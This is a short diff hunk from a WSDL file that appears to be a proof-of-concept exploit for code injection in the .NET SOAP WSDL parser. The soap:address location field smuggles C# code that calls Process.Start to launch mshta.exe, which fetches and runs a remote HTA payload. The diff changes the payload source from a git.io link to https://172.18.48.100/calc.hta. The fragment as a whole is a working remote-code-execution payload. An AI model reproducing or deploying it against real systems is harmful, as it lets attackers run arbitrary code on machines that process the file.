@@ -11,7 +11,7 @@
     </binding>
     <service name="Service">
         <port name="Port" binding="tns:Binding">
-            <soap:address location="http://localhost?C:\Windows\System32\mshta.exe?https://git.io/v5bv2"/>
+            <soap:address location="http://localhost?C:\Windows\System32\mshta.exe?https://172.18.48.100/calc.hta"/>
                         <soap:address location=";
                         if (System.AppDomain.CurrentDomain.GetData(_url.Split('?')[0]) == null) {
                                 System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]);
